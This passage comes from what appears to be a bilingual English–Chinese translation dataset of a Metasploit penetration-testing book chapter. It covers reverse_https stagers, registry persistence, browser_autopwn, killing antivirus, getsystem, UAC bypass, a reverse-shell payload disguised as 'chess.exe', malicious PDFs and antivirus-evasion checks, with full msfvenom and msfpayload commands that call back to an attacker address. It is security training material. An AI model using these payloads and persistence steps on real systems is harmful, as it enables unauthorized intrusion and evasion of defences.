- en: '![Pivoting](img/477-1_12_22.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![枢纽](img/477-1_12_22.jpg)'
- en: 'As the previous screenshot shows, the pivot was successful, and we now have
    another session open within metasploit. This is reflected with the **Local Pipe**
    | **Remote Pipe** reference. Once you complete reviewing the information, enter
    `sessions` to display the information for the sessions. An example of this result
    is shown in the following screenshot:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的屏幕截图所示，枢纽成功了，我们现在在metasploit中有另一个会话打开。这反映在**本地管道** | **远程管道**的引用中。完成查看信息后，输入`sessions`以显示会话的信息。此结果的示例如下屏幕截图所示：
- en: '![Pivoting](img/477-1_12_23.jpg)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![枢纽](img/477-1_12_23.jpg)'
- en: Proxy exploitation
  id: totrans-97
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 代理利用
- en: In this section, we will look at the capability of the metasploit tool to use
    both HTTP and HTTPS for communication. One of the defenses that are often deployed
    against us is the concept of egress or outbound traffic. Now, it is common to
    see that sites only allow outbound HTTP and HTTPS traffic; therefore, the developers
    of metasploit have created modules for this.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，我们将看一下metasploit工具使用HTTP和HTTPS进行通信的能力。我们经常遭受的一种防御是出站或出站流量的概念。现在，通常情况下只允许出站HTTP和HTTPS流量；因此，metasploit的开发人员已经为此创建了模块。
- en: Leveraging the client configuration
  id: totrans-99
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 利用客户端配置
- en: When we use techniques to leverage the communication out to our attacker machine,
    we will read the client configuration and then send the traffic out via the proxy
    that is configured there. Traditionally, this was a difficult process and took
    quite a bit of time to set up. Consequently, the amount of time and the communication
    requirements increased the chance of either getting detected or the session timing
    out. Fortunately, there are additional options that we can explore to assist us
    with this. The developers of metasploit have created two stagers that allow us
    to leverage the client configuration, and they have native support for both HTTP
    and HTTPS communication within the Meterpreter shell. Furthermore, these stagers
    provide the capability to set a number of different options that allow for the
    reconnection of shells over a specified period of time by providing the capability
    to set an expiration date for the session.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们使用技术将通信传输到我们的攻击者机器时，我们将读取客户端配置，然后通过那里配置的代理发送流量。传统上，这是一个困难的过程，需要相当长的时间来设置。因此，时间和通信要求增加了被检测到或会话超时的机会。幸运的是，我们可以探索其他附加选项来帮助我们。metasploit的开发人员已经创建了两个分段器，允许我们利用客户端配置，并且在Meterpreter
    shell内部原生支持HTTP和HTTPS通信。此外，这些分段器提供了设置多种不同选项的能力，允许在指定的时间段内重新连接会话，通过设置会话的到期日期。
- en: 'The two stagers are **reverse_http** and **reverse_https**. These two stagers
    are unique in that they are not tied to a specific TCP session, that is, they
    provide a packet-based transaction method, whereas the other options are stream-based.
    This allows for a more robust set of options for the attack. Moreover, we are
    provided with three options to assist us determine when the user is done, which
    are as follows:'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 这两个分段器是**reverse_http**和**reverse_https**。这两个分段器是独特的，它们不与特定的TCP会话绑定，即它们提供了基于数据包的事务方法，而其他选项是基于流的。这为攻击提供了更强大的一组选项。此外，我们提供了三个选项来帮助我们确定用户何时完成，它们如下：
- en: 'Expiration date: The default is one week'
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 到期日期：默认值为一周
- en: '**Time to Live** (**TTL**): The default is 5 minutes'
  id: totrans-103
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**生存时间**（**TTL**）：默认值为5分钟'
- en: 'Exposed API core: Using the detach command to exit but not to terminate the
    session'
  id: totrans-104
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 暴露的API核心：使用分离命令退出但不终止会话
- en: These parameters allow us to disconnect from the session and automatically reconnect
    later. They also allow us to set the payload as a persistent listener and then
    connect to it even if the target reboots or is shut down. We will explore this
    now.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 这些参数允许我们断开会话并自动稍后重新连接。它们还允许我们将有效载荷设置为持久侦听器，然后即使目标重新启动或关闭，也可以连接到它。我们现在将探讨这一点。
- en: 'We will use a malicious executable for this example. We can use a number of
    different vectors such as web, e-mail, or USB, but for the sake of the easier
    option, we will use the malicious executable. Furthermore, we will use a special
    tool to create the payload. If you do not have metasploit running, enter `msfconsole`
    to start the tool. Once the tool has started, enter `msfvenom -p windows/meterpreter/reverse_https
    -f exe LHOST=192.168.177.170 LPORT=4443 > https.exe` to create the executable
    file named `https.exe`. An example of the output from the command is shown in
    the following screenshot:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用一个恶意可执行文件作为示例。我们可以使用多种不同的向量，如Web、电子邮件或USB，但为了更简单的选择，我们将使用恶意可执行文件。此外，我们将使用一个特殊的工具来创建有效载荷。如果您没有运行metasploit，请输入`msfconsole`来启动该工具。一旦工具启动，输入`msfvenom
    -p windows/meterpreter/reverse_https -f exe LHOST=192.168.177.170 LPORT=4443 >
    https.exe`来创建名为`https.exe`的可执行文件。该命令的输出示例如下屏幕截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_24.jpg)'
  id: totrans-107
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_24.jpg)'
- en: 'Now we will set up the handler. Enter the following in metasploit:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将设置处理程序。在metasploit中输入以下内容：
- en: '[PRE3]'
  id: totrans-109
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'An example of the commands, once completed, is shown in the following screenshot:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦完成，命令的示例如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_25.jpg)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_25.jpg)'
- en: 'We are now ready to have the victim run our executable. After we move the executable
    to the victim machine, double-click on the file, return to the metasploit handler,
    and observe the results. An example of this is shown in the following screenshot:'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们准备让受害者运行我们的可执行文件。在我们将可执行文件移动到受害者机器后，双击文件，返回到metasploit处理程序，并观察结果。这一点的一个例子如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_26.jpg)'
  id: totrans-113
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_26.jpg)'
- en: 'From here, it is a matter of what we want to do. Enter a few commands that
    we used previously in the Meterpreter shell. The added bonus here is the fact
    that we have all the communication egressing out to port 4443, and this will look
    exactly like normal traffic. In Kali, start a capture on Wireshark and observe
    the communications between the machines. An example of this is shown in the following
    screenshot:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 从这里开始，取决于我们想要做什么。在Meterpreter shell中输入我们之前使用过的一些命令。这里的额外好处是我们所有的通信都会传出到4443端口，这看起来会和正常流量一模一样。在Kali中，启动Wireshark的捕获，观察机器之间的通信。这一点的一个例子如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_27.jpg)'
  id: totrans-115
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_27.jpg)'
- en: Again, if we want to change the port to SSH, HTTPS, or any port that we thought
    could get out of the environment we are testing, we are free to do this. For an
    example of how powerful the capability is, continue to have the client connect
    with you. In the Meterpreter shell, enter `detach` to exit the session; as soon
    as you exit, the victim will connect back to you.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，如果我们想要将端口更改为SSH、HTTPS或任何我们认为可以离开我们正在测试的环境的端口，我们是自由的。要了解这种能力有多强大，继续让客户端与你连接。在Meterpreter
    shell中，输入`detach`退出会话；一旦你退出，受害者就会重新连接到你。
- en: 'An example of this is shown in the following screenshot:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 这一点的一个例子如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_28.jpg)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_28.jpg)'
- en: 'The next thing we will attempt to do is set the victim up by copying the code
    to the registry so that the attack will survive even a reboot. In the Meterpreter
    shell, enter the following commands:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 我们接下来要尝试的是通过将代码复制到注册表中来设置受害者，以便攻击即使在重启后也能生存。在Meterpreter shell中，输入以下命令：
- en: '[PRE4]'
  id: totrans-120
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'An example of the result of using these commands is shown in the following
    screenshot:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 使用这些命令的结果示例如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_29.jpg)'
  id: totrans-122
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_29.jpg)'
- en: 'With these commands, we first enumerated the registry, and then set the key
    to reference the program at startup. As the third command shows, the `evil` program
    is now located in the registry key. Of course, if we were trying to hide it, we
    would name it something else. We can verify that the program has been planted
    by accessing the Windows XP machine and navigating to **Start** | **Run** | **regedit**
    and searching for the program. An example of this is shown in the following screenshot:'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这些命令，我们首先枚举了注册表，然后设置了引用启动时的程序。正如第三个命令所示，`evil`程序现在位于注册表键中。当然，如果我们试图隐藏它，我们会给它取一个别的名字。我们可以通过访问Windows
    XP机器并导航到**开始** | **运行** | **regedit**并搜索程序来验证程序是否已经植入。这一点的一个例子如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_31.jpg)'
  id: totrans-124
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_31.jpg)'
- en: 'We now want to reboot the victim machine. After the reboot, an example of the
    results of the connection returning in the metasploit window is shown in the following
    screenshot:'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们要重启受害者机器。重启后，连接返回到metasploit窗口的结果示例如下截图所示：
- en: '![Leveraging the client configuration](img/477-1_12_30.jpg)'
  id: totrans-126
  prefs: []
  type: TYPE_IMG
  zh: '![利用客户端配置](img/477-1_12_30.jpg)'
- en: Client-side exploitation
  id: totrans-127
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 客户端利用
- en: Thus far, most of what we have covered has been a form of client exploitation.
    In this section, we will look at more methods of attacking a client. We will continue
    to exploit the machine using the vector of a client, clicking on a link or file
    and being directed to our attacker machine. Before we continue, we want to reiterate
    that at the time of writing this book, we used the latest and greatest attacks
    that were available. By the time you read this book, some things will have changed.
    However, the one thing that will remain constant is the process and methodology.
    As long as you continue to follow the systematic process, you will be able to
    uncover and identify the latest techniques and modify your approach accordingly.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们所涵盖的大部分内容都是一种客户端利用的形式。在本节中，我们将探讨更多攻击客户端的方法。我们将继续利用客户端的矢量来攻击机器，点击链接或文件并被重定向到我们的攻击者机器。在我们继续之前，我们想再次强调，在撰写本书时，我们使用了最新和最先进的攻击方法。当你阅读本书时，一些事情可能已经发生了变化。然而，唯一不变的是过程和方法论。只要你继续遵循系统化的过程，你就能发现和识别最新的技术，并相应地修改你的方法。
- en: One of the challenges of the previous methods we used in the chapter is that
    we had to select a particular exploit based on the version of the software we
    encountered. We did this with Java and Internet Explorer. This worked well, but
    what if we do not know what exactly the victim is going to have on their system
    when they connect to us? As you may imagine, this is a legitimate concern. Fortunately
    for us, it has been addressed by the exceptional developers at metasploit. Consequently,
    they have provided us a module that will try to serve up a variety of exploits
    once the connection is made. That module is `browser_autopwn`. This powerful module
    does sets up a web server with all of the current exploits in the inventory, and
    when a connection is made, the module runs through the available exploits until
    it finds one. Remember, as it can never be ignored, exploitation is not 100 percent,
    so there is a chance that it will fail. But as testers, we have to always make
    the attempt and maintain the practice of documenting the findings and move on
    with our testing.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在本章中使用的先前方法的一个挑战是，我们必须根据我们遇到的软件版本选择特定的漏洞利用。我们在Java和Internet Explorer上做到了这一点。这很有效，但是如果我们不知道受害者连接到我们时系统上确切会有什么呢？你可以想象，这是一个合理的担忧。幸运的是，metasploit出色的开发人员已经解决了这个问题。因此，他们为我们提供了一个模块，一旦连接建立，将尝试提供各种漏洞利用。这个模块就是`browser_autopwn`。这个强大的模块设置了一个带有库存中所有当前漏洞利用的Web服务器，当连接建立时，该模块会运行所有可用的漏洞利用，直到找到一个。记住，正如不能被忽视的那样，利用并不是100%，所以有可能失败。但作为测试人员，我们必须始终尝试，并保持记录发现并继续我们的测试。
- en: 'So, let''s get started. In the metasploit interface, enter the following commands:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，让我们开始吧。在metasploit界面中，输入以下命令：
- en: '[PRE5]'
  id: totrans-131
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'The `URIPATH` setting tells metasploit not to generate a random URL. We want
    the client to just connect to the address of the server running on the Kali machine.
    An example of these settings is shown in the following screenshot:'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: '`URIPATH`设置告诉metasploit不要生成随机URL。我们希望客户端只连接到运行在Kali机器上的服务器的地址。以下是这些设置的示例截图：'
- en: '![Client-side exploitation](img/477-1_12_32.jpg)'
  id: totrans-133
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_32.jpg)'
- en: 'You will notice that once you have entered the `run` command, the tool will
    start creating a number of components to support our exploits. This will take
    some time to complete. An example of some of the output of the different components
    being created for the exploits is shown in the following screenshot:'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦输入了`run`命令，你会注意到工具开始创建支持我们的漏洞利用的许多组件。这将需要一些时间来完成。以下是一些不同组件为漏洞利用创建的输出的示例截图：
- en: '![Client-side exploitation](img/477-1_12_33.jpg)'
  id: totrans-135
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_33.jpg)'
- en: 'At the time of writing this book, we had 19 exploits that were created as part
    of the preparation for a connection from a victim. An example of this is shown
    in the following screenshot:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 在撰写本书时，我们准备了19个漏洞利用，作为连接受害者的准备工作的一部分。以下是示例截图：
- en: '![Client-side exploitation](img/477-1_12_34.jpg)'
  id: totrans-137
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_34.jpg)'
- en: We did not comment on it previously, but as soon as a shell is received, you
    will notice that a migration process takes place. This is because the browsers
    are not very stable when you attempt the exploits. So, once you gain access, it
    is important to migrate the exploit. If the browser crashes or is closed by the
    user, it has little impact on your session.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 我们之前没有评论过，但是一旦收到shell，你会注意到迁移过程正在进行。这是因为当你尝试利用漏洞时，浏览器并不是非常稳定。因此，一旦获得访问权限，迁移利用是很重要的。如果浏览器崩溃或被用户关闭，对你的会话影响不大。
- en: 'An example of the results when a client connects is shown in the following
    screenshot:'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 当客户端连接时的结果示例如下截图所示：
- en: '![Client-side exploitation](img/477-1_12_35.jpg)'
  id: totrans-140
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_35.jpg)'
- en: 'As a reminder, the module will continue to fire exploits and try to get a session,
    but there are no guarantees that it will. Some of you reading this may wonder
    what happens if another machine connects to our server. For an example of this
    using Firefox as the browser, refer to the following screenshot:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 作为提醒，模块将继续触发漏洞并尝试获取会话，但不能保证一定成功。阅读本书的一些人可能会想知道，如果另一台机器连接到我们的服务器会发生什么。使用Firefox作为浏览器的示例，请参考以下截图：
- en: '![Client-side exploitation](img/477-1_12_36.jpg)'
  id: totrans-142
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_36.jpg)'
- en: 'From this point, all you can do is wait and see whether you get lucky and one
    of the exploits is successful. If all goes well, you will eventually see a session
    open. An example of this is shown in the following screenshot:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 从这一点开始，你所能做的就是等待，看看你是否能幸运地成功利用其中一个漏洞。如果一切顺利，最终你会看到一个会话打开。以下是示例截图：
- en: '![Client-side exploitation](img/477-1_12_37.jpg)'
  id: totrans-144
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_37.jpg)'
- en: 'Now that we have a shell, we can perform any number of things we covered earlier
    in the book. There is one we have not covered until this point, and we will do
    it now. Start interacting with the Meterpreter shell with the sessions command.
    Once you are in the shell, enter `run getcountermeasure` to see what types of
    protections are on the client. An example of this is shown in the following screenshot:'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有了一个shell，我们可以执行本书中之前介绍的任何事情。到目前为止我们还没有介绍过一个，我们现在来介绍一下。使用sessions命令开始与Meterpreter
    shell进行交互。一旦进入shell，输入`run getcountermeasure`查看客户端上有什么类型的保护。以下是示例截图：
- en: '![Client-side exploitation](img/477-1_12_38.jpg)'
  id: totrans-146
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_38.jpg)'
- en: 'We see that we have a potential antivirus program on the machine, and we also
    see that we have the firewall on. The first thing we want to do is attempt to
    kill the antivirus program. Enter `run killav` to attempt to kill the running
    antivirus program. An example of this is shown in the following screenshot:'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到机器上有一个潜在的杀毒程序，我们也看到防火墙已经打开。我们要做的第一件事是尝试关闭杀毒程序。输入`run killav`尝试关闭正在运行的杀毒程序。以下是示例截图：
- en: '![Client-side exploitation](img/477-1_12_39.jpg)'
  id: totrans-148
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_39.jpg)'
- en: 'As the previous screenshot shows, we are not successful, and this is because
    we are not at the privilege level we need to be. We can try to migrate to a process
    to escalate our privileges, but this means we have to do extra work to determine
    what process to migrate to, and we may not be successful. So, let''s try another
    method. As we continue to state, we have the methodology; the tools will come
    with time and a lot of practice. In the Meterpreter shell, enter `getsystem` to
    let the tool try a number of techniques to escalate privileges. An example of
    this is shown in the following screenshot:'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们没有成功，这是因为我们没有达到所需的特权级别。我们可以尝试迁移到一个进程来提升我们的特权，但这意味着我们必须额外工作来确定要迁移到哪个进程，而且我们可能不会成功。所以，让我们尝试另一种方法。正如我们不断强调的，我们有方法论；工具会随着时间和大量实践而来。在Meterpreter
    shell中，输入`getsystem`让工具尝试一些技术来提升特权。这方面的一个示例如下截图所示：
- en: '![Client-side exploitation](img/477-1_12_40.jpg)'
  id: totrans-150
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_40.jpg)'
- en: As the previous screenshot shows, we now have system, and as such, could turn
    off the protection that we detected earlier. Moreover, we can do pretty much anything
    we want on this system since the privilege has been escalated. We will leave that
    as a homework exercise for those of you who want to explore further.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们现在拥有系统，并且可以关闭我们之前检测到的保护。此外，由于权限已经提升，我们可以在这个系统上做任何我们想做的事情。我们将把这留作一个作业练习，供那些想进一步探索的人使用。
- en: We will look at one more thing here in this section, and that is the ability
    to bypass the **User Account Control** (**UAC**) on a machine. As we discovered
    earlier, there is no guarantee that we will be successful, but we can at least
    attempt it. In the metasploit tool, if you no longer have sessions active, exploit
    the machine using any of the variety of methods we covered and determine what
    privilege level the session is at. Once you have done this, set the session in
    the background and search for an exploit. We have covered the steps for all of
    this so we will not cover them again here. Once you are ready to search, enter
    `search uac` and search for a UAC bypass.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将再看一件事，那就是绕过机器上的用户账户控制（UAC）的能力。正如我们之前发现的，不能保证我们会成功，但至少我们可以尝试一下。在metasploit工具中，如果你不再有活动会话，使用我们之前介绍的各种方法之一来利用机器，并确定会话的特权级别。一旦你做到了这一点，将会话设置为后台，并搜索一个漏洞。我们已经介绍了所有这些步骤，所以在这里我们不会再介绍它们。一旦你准备好搜索，输入`search
    uac`并搜索UAC绕过。
- en: 'An example of the results from the search is shown in the following screenshot:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 搜索结果的示例如下截图所示：
- en: '![Client-side exploitation](img/477-1_12_41.jpg)'
  id: totrans-154
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_41.jpg)'
- en: 'As the previous screenshot shows, we have a number of different techniques
    available, but a concern is that there is nothing newer than 2012, so our success
    in exploiting this may be limited. We can always try, and since we have three
    techniques rated as excellent, we will use them. One thing they all have in common
    is that a session must be started to attempt the bypass. We will start at the
    bottom and work our way up. An example of the results is shown in the following
    screenshot:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们有许多不同的技术可用，但一个问题是，没有比2012年更新的内容，所以我们在利用这方面的成功可能会有限。我们可以尝试，而且由于我们有三种被评为优秀的技术，我们将使用它们。它们共同的一点是，必须启动一个会话才能尝试绕过。我们将从底部开始，逐步向上工作。搜索结果的示例如下截图所示：
- en: '![Client-side exploitation](img/477-1_12_42.jpg)'
  id: totrans-156
  prefs: []
  type: TYPE_IMG
  zh: '![客户端利用](img/477-1_12_42.jpg)'
- en: As the previous screenshot shows, we are successful with the first attempt,
    and from this point, we can proceed with post-exploitation techniques were covered
    previously. Remember to stay within the requirements as detailed in our scope
    of work.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们在第一次尝试中成功了，从这一点开始，我们可以继续进行之前介绍的后期利用技术。请记住要遵守我们工作范围中详细说明的要求。
- en: Binary payloads
  id: totrans-158
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 二进制有效载荷
- en: 'In the metasploit tool, we have the capability to generate our own binary payloads,
    and this is what we will look at in this section. To see the options for this,
    start the metasploit tool and enter `msfpayload windows/shell_reverse_tcp O`.
    The `O` at the end will display the options that can be set for our payload. Since
    we are setting a reverse shell, you probably have a good idea of the options for
    this. An example of the output from this command is shown in the following screenshot:'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 在metasploit工具中，我们有能力生成自己的二进制有效载荷，这就是我们将在本节中讨论的内容。要查看这个选项，启动metasploit工具，输入`msfpayload
    windows/shell_reverse_tcp O`。结尾的`O`将显示可以为我们的有效载荷设置的选项。由于我们正在设置一个反向shell，你可能已经对此有一个很好的想法。这个命令的输出示例如下截图所示：
- en: '![Binary payloads](img/477-1_12_43.jpg)'
  id: totrans-160
  prefs: []
  type: TYPE_IMG
  zh: '![二进制有效载荷](img/477-1_12_43.jpg)'
- en: As the previous screenshot shows, we have default settings that are based on
    our local machine address for the Kali machine. Therefore, we really do not require
    any changes unless we want to define a specific `LPORT` to egress a firewall.
    So, for our purposes, we will leave the settings as they are. Enter `msfpayload
    LPORT=4443 X > /tmp/chess.exe`. Once the file is created, we will view the details
    of the file. In the window, enter `file /tmp/chess.exe`.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们有基于我们Kali机器的本地机器地址的默认设置。因此，除非我们想要定义一个特定的`LPORT`来穿越防火墙，否则我们实际上不需要进行任何更改。对于我们的目的，我们将保持设置不变。输入`msfpayload
    LPORT=4443 X > /tmp/chess.exe`。文件创建后，我们将查看文件的详细信息。在窗口中输入`file /tmp/chess.exe`。
- en: 'An example of the output of these commands is shown in the following screenshot:'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 这些命令的输出示例如下截图所示：
- en: '![Binary payloads](img/477-1_12_44.jpg)'
  id: totrans-163
  prefs: []
  type: TYPE_IMG
  zh: '![二进制有效载荷](img/477-1_12_44.jpg)'
- en: 'We are now ready for the next step, which is to get the file onto the victim
    machine so they can execute it. This is why we selected the name of `chess`; it
    appears that we have a game for them to play. Before we transfer the file to the
    machine, we have to set up the metasploit tool to receive the connection. In the
    metasploit window, enter the following:'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在准备进行下一步，即将文件传输到受害者机器上，以便他们可以执行它。这就是为什么我们选择了`chess`这个名字；看起来我们为他们准备了一个游戏。在将文件传输到机器之前，我们必须设置metasploit工具以接收连接。在metasploit窗口中，输入以下内容：
- en: '[PRE6]'
  id: totrans-165
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'An example of the results of this is shown in the following screenshot:'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 这种结果的示例如下屏幕截图所示：
- en: '![Binary payloads](img/477-1_12_45.jpg)'
  id: totrans-167
  prefs: []
  type: TYPE_IMG
  zh: 二进制有效负载
- en: We are now set for the victim to connect. As we did throughout the chapter,
    we copy the file to the victim machine and then execute it. Since we've explained
    this a number of times, we will move on to the next item.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经准备好受害者连接。就像在整章中一样，我们将文件复制到受害者机器上，然后执行它。由于我们已经解释了很多次，我们将继续下一个项目。
- en: Malicious PDF files
  id: totrans-169
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 恶意PDF文件
- en: 'Another popular vector of attack is that of using common files to host our
    exploit code, and that is what we do with the malicious PDF files. We will create
    a payload in a PDF file; when the victim runs it using a vulnerable version of
    Adobe Reader, we gain access to the machine. This vector has been used many times
    to compromise a great number of companies. Within metasploit, there are a number
    of tools at our disposal that will allow us to create the PDF file. In metasploit
    enter the following commands:'
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个常见的攻击载体是使用常见文件来托管我们的利用代码，这就是我们在恶意PDF文件中所做的。我们将在PDF文件中创建一个有效负载；当受害者使用易受攻击的Adobe
    Reader版本运行它时，我们就可以访问该机器。这种载体已经多次被用来妥协大量公司。在metasploit中，有许多工具可供我们使用来创建PDF文件。在metasploit中输入以下命令：
- en: '[PRE7]'
  id: totrans-171
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'An example of the output of this command is shown in the following screenshot:'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令的输出示例如下屏幕截图所示：
- en: '![Malicious PDF files](img/477-1_12_46.jpg)'
  id: totrans-173
  prefs: []
  type: TYPE_IMG
  zh: 恶意PDF文件
- en: As the previous screenshot shows, we now have the payload disguised as a PDF.
    The screenshot also shows that we need a specific version of Adobe for the exploit
    to work. Again, we went through the process enough, and we will not repeat it
    here. The process is the same; the only difference here is that we will use a
    PDF file as the vector for attack.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的屏幕截图所示，我们现在将有效负载伪装成PDF。屏幕截图还显示，我们需要特定版本的Adobe才能使漏洞利用起作用。同样，我们已经经历了足够的过程，这里就不再重复了。过程是一样的；唯一的区别是我们将使用PDF文件作为攻击的载体。
- en: Bypassing antivirus and other protection tools
  id: totrans-175
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过杀毒软件和其他保护工具
- en: One of the challenges we face with client-side testing is that there (more than
    likely) will be endpoint protections in place, so there is a good chance of not
    only getting caught, but also having our vector deleted by the host protections.
    As with any signature-based detection, there is a database that contains the signatures
    of the different viruses and their variants that have been discovered. When we
    look at the techniques we used throughout this chapter, we will need to see whether
    the payload we developed is going to be detected by antivirus software.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在客户端测试中面临的挑战之一是（很可能）会有端点保护措施，因此不仅有可能被抓住，还有可能被主机保护删除我们的载体。与任何基于签名的检测一样，存在一个包含已发现的不同病毒及其变种签名的数据库。当我们查看本章中使用的技术时，我们需要看看我们开发的有效负载是否会被杀毒软件检测到。
- en: Note
  id: totrans-177
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: A site that is very good at helping is [www.virustotal.com](http://www.virustotal.com).
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 一个非常有帮助的网站是[www.virustotal.com](http://www.virustotal.com)。
- en: 'We can upload our potential payload and see whether it is detected by the antivirus.
    An example of the `https.exe` file that we created earlier in this chapter is
    shown in the following screenshot:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以上传我们的潜在有效负载，并查看杀毒软件是否检测到它。在本章前面创建的`https.exe`文件的示例如下屏幕截图所示：
- en: '![Bypassing antivirus and other protection tools](img/477-1_12_47.jpg)'
  id: totrans-180
  prefs: []
  type: TYPE_IMG
  zh: 绕过杀毒软件和其他保护工具
- en: 'As the previous screenshot shows, 34 out of 51 antivirus products detect the
    file. That is about 67 percent and is not a very good detection rate. As we did
    previously, we will look and see whether the site we are testing has a version
    of antivirus, and then we will look to see whether the product is successful when
    looking at the file. An example of some of the products that did not detect the
    code as malicious is shown in the following screenshot:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的屏幕截图所示，51个杀毒产品中有34个检测到了该文件。这大约占了67%，并不是一个很好的检测率。与之前一样，我们将查看我们正在测试的网站是否有杀毒软件的版本，然后我们将查看该产品在查看文件时是否成功。以下屏幕截图显示了一些未将代码检测为恶意的产品示例：
- en: '![Bypassing antivirus and other protection tools](img/477-1_12_48.jpg)'
  id: totrans-182
  prefs: []
  type: TYPE_IMG
  zh: 绕过杀毒软件和其他保护工具
- en: 'The next file we want to look at is our PDF file. An example of the detection
    ability is shown in the following screenshot:'
  id: totrans-183
  prefs: []
